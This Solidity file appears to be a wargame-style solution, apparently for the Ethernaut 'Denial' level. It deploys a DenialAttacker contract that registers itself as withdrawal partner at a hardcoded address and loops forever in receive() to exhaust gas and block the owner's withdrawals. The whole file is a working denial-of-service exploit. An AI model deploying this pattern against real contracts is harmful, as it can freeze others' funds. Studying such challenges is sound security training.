// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;


interface IDenial {
    function setWithdrawPartner(address) external;
    function withdraw() external;
}

contract DenialAttacker {
    constructor(){
       IDenial yo = IDenial(0xEC11848EEC3DbDe710641e7963d66B123fDb01b3); 
       yo.setWithdrawPartner(address(this));
    }
    
    receive() external payable{
        while(true) {}
    }
}